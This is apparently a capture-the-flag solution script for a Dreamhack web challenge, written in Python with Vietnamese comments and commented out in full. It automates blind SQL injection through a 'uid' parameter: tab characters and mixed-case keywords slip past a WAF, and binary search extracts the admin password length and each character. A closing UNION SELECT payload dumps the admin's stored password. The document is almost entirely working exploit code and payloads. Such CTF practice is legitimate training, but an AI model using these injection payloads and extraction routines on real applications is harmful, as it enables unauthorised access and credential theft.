```python
# import asyncio
# import aiohttp
# import re
# from aiohttp import ClientTimeout

# # Cập nhật đúng URL từ cổng challenge của bạn
# URL = "http://dreamhack.games" 
# PARAM = "uid"

# MAX_CONCURRENT = 3
# RETRIES = 3
# TIMEOUT = 10

# CHARSET = [chr(c) for c in range(32, 127)]
# CHARSET.sort()

# async def is_true(session, payload, retry=0):
#     try:
#         async with session.get(URL, params={PARAM: payload}, timeout=ClientTimeout(total=TIMEOUT)) as resp:
#             text = await resp.text()
            
#             # Nếu bị WAF chặn, chắc chắn sai
#             if "blocked by WAF" in text:
#                 return False
            
#             # Tìm tất cả nội dung nằm trong các cặp thẻ <pre>...</pre>
#             results = re.findall(r'<pre[^>]*>(.*?)</pre>', text, re.DOTALL)
            
#             # Thẻ <pre> thứ nhất chứa câu lệnh truy vấn mẫu
#             # Thẻ <pre> thứ hai (index 1) chứa kết quả result[1] từ database
#             if len(results) >= 2:
#                 content = results[1].strip()
#                 # Nếu câu lệnh đúng -> tìm thấy admin -> thẻ này sẽ có nội dung
#                 # Nếu câu lệnh sai -> không tìm thấy -> thẻ này sẽ trống rỗng ("")
#                 return len(content) > 0
                
#             return False
#     except Exception:
#         if retry < RETRIES:
#             await asyncio.sleep(2 ** retry)
#             return await is_true(session, payload, retry + 1)
#         return False

# async def get_length(session):
#     low, high = 0, 60
#     while low < high:
#         mid = (low + high + 1) // 2
#         # Sử dụng ký tự Tab \t để bypass qua bộ lọc khoảng trắng của WAF
#         payload = f"adMn'||\t(SeLECT\tLENGTH(upw)\tFrOm\tuser\tWHeRE\tuid='AdMin')>{mid}\t--\t-"
#         if await is_true(session, payload):
#             low = mid
#         else:
#             high = mid - 1
#     return low

# async def get_char_at_pos(session, pos):
#     low, high = 0, len(CHARSET) - 1
#     while low < high:
#         mid = (low + high) // 2
#         # Sử dụng phép so sánh '>' phục vụ thuật toán Binary Search 
#         payload = f"adn'||\t(SUBsTRING((SeLEcT\tupw\tfRoM\tuser\tWhERE\tuid='aDmin'),{pos},1)>'{CHARSET[mid]}')\t--\t-"
#         if await is_true(session, payload):
#             low = mid + 1
#         else:
#             high = mid
#     return CHARSET[low]

# async def extract_password(session, length):
#     sem = asyncio.Semaphore(MAX_CONCURRENT)
#     async def bounded(pos):
#         async with sem:
#             return await get_char_at_pos(session, pos)
#     tasks = [bounded(pos) for pos in range(1, length + 1)]
#     chars = await asyncio.gather(*tasks)
#     return ''.join(chars)

# async def main():
#     async with aiohttp.ClientSession() as session:
#         print("[*] Finding password length...")
#         length = await get_length(session)
#         print(f"[+] Password length: {length}")

#         if length == 0:
#             print("[-] Could not find password length. Check your TRUE/FALSE indicator logic.")
#             return

#         print("[*] Extracting password...")
#         password = await extract_password(session, length)
#         hex_repr = ' '.join(f'{ord(c):04X}' for c in password)
#         print(f"[+] Password: {password}")
#         print(f"[+] Hex: {hex_repr}")

# if __name__ == "__main__":
#     asyncio.run(main())

```
```
'	Union	SElect	idx,upw,uid	From	user	Where	uid='aDmin'	--	-
```